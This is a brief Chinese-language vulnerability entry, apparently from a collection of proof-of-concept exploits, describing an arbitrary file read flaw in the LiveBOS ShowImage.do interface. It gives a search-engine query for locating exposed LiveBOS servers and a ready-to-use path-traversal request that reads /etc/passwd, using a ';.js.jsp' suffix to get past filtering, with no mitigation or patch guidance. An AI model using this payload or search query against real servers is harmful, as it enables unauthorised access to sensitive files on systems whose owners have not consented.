# LiveBOS ShowImage.do 任意文件读取漏洞

## 漏洞描述

LiveBOS ShowImage.do 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件

## 漏洞影响

<a-checkbox checked>LiveBOS</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="LiveBOS-框架"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1692167542101-f3880815-0b7c-4042-ba05-367aba446765.png)

验证POC

```plain
/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd
```

![img](../../../.vuepress/public/img/1692167639036-b19192bb-12d1-4dff-bda7-02d6fa610224.png)